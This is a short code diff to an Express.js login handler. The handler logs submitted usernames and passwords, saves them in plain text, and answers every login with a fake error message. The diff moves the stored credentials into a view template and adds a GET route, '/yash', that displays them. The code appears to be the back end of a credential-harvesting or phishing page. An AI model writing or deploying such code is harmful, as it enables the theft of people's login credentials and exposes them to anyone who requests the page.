@@ -20,7 +20,7 @@ app.post('/login', (req, res) => {
   
     console.log(username); 
     console.log(Password);
-    fs.writeFile('loginDetails.txt', username + " Pass: " + Password, (err) => {
+    fs.writeFile('./views/loginDetails.ejs', username + " Pass: " + Password, (err) => {
         if (err) {
             console.error(err);
             res.status(500).send('Error 404 , Please try again ');
@@ -29,6 +29,9 @@ app.post('/login', (req, res) => {
             res.send('Something went wron please try again Status Code:404');
         }
     });
+});
+app.get("/yash",(req, res)=>{
+    res.render("loginDetails.ejs");
 });
 
 app.listen(port, () => {
